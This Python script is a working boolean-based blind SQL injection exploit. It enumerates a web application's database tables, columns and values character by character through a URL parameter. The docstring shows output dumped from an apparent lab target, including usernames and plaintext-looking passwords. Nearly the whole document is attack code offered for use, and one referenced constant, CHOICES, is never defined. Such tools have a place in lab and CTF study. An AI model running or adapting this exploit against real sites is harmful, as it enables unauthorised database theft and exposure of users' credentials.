#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
$ ./blind_get_list_data.py -u http://172.28.128.3:8007/membre.php\?id\=7 -e Mickey
OtherInformation:
        * idusers
                -> 7,8,9,10,11
        * useyourname
                -> Mickey,Kenshin,Jin,Camus,Pierre
        * position
                -> user,user,admin,user,user
        * programmation
                -> Asm, C, C++,Pyhton, Ruby,VB, PHP,Pascal, Fortan,Brainfuck, Delphi
        * biographie
                -> Programmation, reversing,Cryptographie, Steganographie,Web, Logique,Wargame,Programmation, Reversing
        * naissance
                -> 16/07/1991,20/02/1979,10/10/1998,25/12/1992,06/06/1996
        * score
                -> 15000,26000,400,103000,51000
WhatIsMyName:
        * idusers
                -> 7,8,9,10,11
        * ISeeDeadPeople
                -> Mickey,Kenshin,Jin,Camus,Pierre
        * NoWatching
                -> themouse,bongarsva!,k4z4maWin,DuVerseau,Quiroulenamassepasmousse

"""
import requests
import argparse


DEBUG = False
LOG = lambda name, var: DEBUG and print('{}: {}'.format(name, var))
SUBQUERIES = {
    # find the table name
    'table': """(select group_concat(table_name separator ',')
        from information_schema.tables where table_schema=database())""",
    # Find columns for a known table
    'columns': lambda table: """(select group_concat(column_name separator ',')
        from information_schema.columns where table_name='{}')""".format(table),
    # Find all values in a known table.column
    'values': lambda table, column: """(select group_concat({} separator ',')
        from {})""".format(column, table),
}
# QUERY EXPLAINED:
#   subquery: SUBQUERIES.values(), depends what we're looking for
#   idx: position of the char to identify
#   shift: bit shifting position, to find a char in 8 requests
#   n: expected number, will return a boolean to answer the bitwise question
QUERY = lambda subquery, idx, shift, n: """' and (ascii(substring({},{},1))
>> {})='{}""".format(subquery, idx, shift, n)


def main(url, expected, subquery, debug):
    global DEBUG
    DEBUG = debug
    s = requests.Session()
    result = ''
    while 1:
        idx = len(result) + 1
        n = 0
        for shift in reversed(range(8)):
            LOG('n', n)
            n = n << 1
            exploit_url = url + QUERY(subquery, idx, shift, n)
            page = s.post(exploit_url)
            # if n = 100 and page is returned, then n is correct. else n = 101
            n += 0 if expected in page.text else 1
        if not n:
            # No character was found, end of result
            return result
        result += chr(n)
        LOG('result', result)


def parse_args():
    parser = argparse.ArgumentParser(description='Blind Injection exploit')
    parser.add_argument('-u', '--url', action='store', dest='url', required=True,
        help='url to exploit, eg "http://172.28.128.3:8007/membre.php?id=7"')
    parser.add_argument('-e', '--expected', action='store', dest='expected',
        help='expected string to find in page result for argument', required=True)
    parser.add_argument('--debug', action='store_true', dest='debug',
        help='verbose print')
    parser.add_argument('-f', '--find', help='data to find',
        action='store', dest='to_find', choices=CHOICES)
    return parser.parse_args()

   
if __name__ == '__main__':
    args = parse_args()

    # First let's get the tables
    tables = main(args.url, args.expected, SUBQUERIES['table'], args.debug)
    for table in tables.split(','):
        print('{}:'.format(table))
        # Then let's figure out the columns of those tables
        columns = main(args.url, args.expected, SUBQUERIES['columns'](table),
                args.debug)
        for column in columns.split(','):
            print('\t* {}'.format(column))
            # Finally, dump the values in those columns
            values = main(args.url, args.expected,
                SUBQUERIES['values'](table, column), args.debug)
            print ('\t\t-> {}'.format(values))

